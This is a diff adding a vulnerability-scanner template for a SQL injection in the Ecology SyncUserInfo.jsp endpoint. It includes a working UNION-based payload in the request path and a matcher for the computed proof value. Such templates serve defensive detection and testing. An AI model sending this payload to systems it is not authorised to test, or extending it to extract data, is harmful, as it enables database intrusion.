@@ -1,0 +1,23 @@
+id: ecology-syncuserinfo-sqli
+name: Ecology Syncuserinfo - SQL Injection
+severity: critical
+confidence: tentative
+description: Ecology Syncuserinfo contains a SQL injection vulnerability via a GET request. An attacker can possibly obtain
+  sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of
+  the affected site.
+reference: CWE-89
+tags:
+- ecology
+- sqli
+- vuln
+requests:
+- method: GET
+  path: /mobile/plugin/SyncUserInfo.jsp?userIdentifiers=-1)union(select(3),null,null,null,null,null,str(98989*44313),null
+  matchers:
+  - type: body
+    words:
+    - '4386499557'
+  - type: status
+    status:
+    - 200
+  condition: and
